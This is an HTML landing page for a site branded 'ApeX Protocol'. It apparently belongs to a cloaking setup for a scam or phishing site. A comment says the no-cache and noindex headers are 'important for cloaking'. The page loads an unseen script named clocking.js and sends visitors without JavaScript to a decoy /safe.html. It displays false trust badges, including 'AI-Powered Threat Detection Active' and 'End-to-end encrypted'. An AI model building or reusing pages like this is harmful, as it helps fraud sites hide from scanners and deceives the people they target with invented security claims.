<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="mobile-web-app-capable" content="yes" />
    <!-- Prevent caching and indexing – important for cloaking -->
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
    <meta http-equiv="Pragma" content="no-cache" />
    <meta http-equiv="Expires" content="0" />
    <meta name="robots" content="noindex, nofollow" />
    <title>ApeX Protocol | Secure Entry</title>
    <!-- Font Awesome for icons (optional, matches your style) -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #fff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            position: relative;
        }

        .bg-particles {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle at 20% 30%, rgba(255,107,0,0.05) 0%, transparent 30%),
                        radial-gradient(circle at 80% 70%, rgba(255,107,0,0.05) 0%, transparent 30%);
            z-index: 0;
        }

        .container {
            position: relative;
            z-index: 1;
            text-align: center;
            max-width: 600px;
            padding: 2rem;
            background: rgba(15, 23, 42, 0.7);
            backdrop-filter: blur(10px);
            border-radius: 32px;
            border: 1px solid rgba(255,107,0,0.2);
            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
        }

        .logo {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            margin-bottom: 24px;
        }

        .logo i {
            font-size: 3rem;
            color: #ff6b00;
            filter: drop-shadow(0 0 10px rgba(255,107,0,0.5));
        }

        .logo span {
            font-size: 2.2rem;
            font-weight: 700;
            letter-spacing: 2px;
            background: linear-gradient(135deg, #fff 0%, #ff6b00 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .loader {
            display: inline-block;
            width: 64px;
            height: 64px;
            border: 5px solid rgba(255,107,0,0.2);
            border-top: 5px solid #ff6b00;
            border-radius: 50%;
            animation: spin 1s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite;
            margin: 32px auto;
            box-shadow: 0 0 20px rgba(255,107,0,0.3);
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        h2 {
            font-size: 1.8rem;
            font-weight: 400;
            margin-bottom: 16px;
            color: #e2e8f0;
        }

        p {
            font-size: 1rem;
            color: #94a3b8;
            line-height: 1.6;
            margin-bottom: 8px;
        }

        .security-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: rgba(255,107,0,0.1);
            padding: 8px 20px;
            border-radius: 40px;
            border: 1px solid rgba(255,107,0,0.3);
            margin-top: 24px;
            font-size: 0.9rem;
            color: #ffd7b3;
        }

        .security-badge i {
            color: #ff6b00;
        }

        footer {
            margin-top: 32px;
            font-size: 0.8rem;
            color: #475569;
        }
        /* Fallback message for users without JavaScript */
        .noscript-warning {
            margin-top: 20px;
            padding: 10px;
            background: rgba(255,0,0,0.2);
            border: 1px solid #ff0000;
            border-radius: 8px;
            color: #ffaaaa;
        }
    </style>
   
    <script type="module" src="./Java/clocking.js"></script>
</head>
<body>
    <div class="bg-particles"></div>
    <div class="container">
        <div class="logo">
            <i class="fas fa-ape"></i>
            <span>APEX</span>
        </div>
        <div class="loader"></div>
        <h2>Establishing Secure Connection</h2>
        <p>Validating environment • Applying security policies • Routing to optimal gateway</p>
        <p style="font-size: 0.9rem; color: #64748b;">This may take a few seconds...</p>
        
        <div class="security-badge">
            <i class="fas fa-shield-alt"></i> AI-Powered Threat Detection Active
        </div>

        <footer>
            <i class="fas fa-lock"></i> End-to-end encrypted • v3.0.1
        </footer>
    </div>

    <!-- Fallback for users with JavaScript disabled -->
    <noscript>
        <div class="container" style="margin-top: 20px;">
            <div class="noscript-warning">
                <i class="fas fa-exclamation-triangle"></i>
                JavaScript is required to proceed. Please enable JavaScript or 
                <a href="/safe.html" style="color: #ff6b00;">click here</a> to continue.
            </div>
        </div>
        <meta http-equiv="refresh" content="0; url=/safe.html">
    </noscript>
</body>
</html>
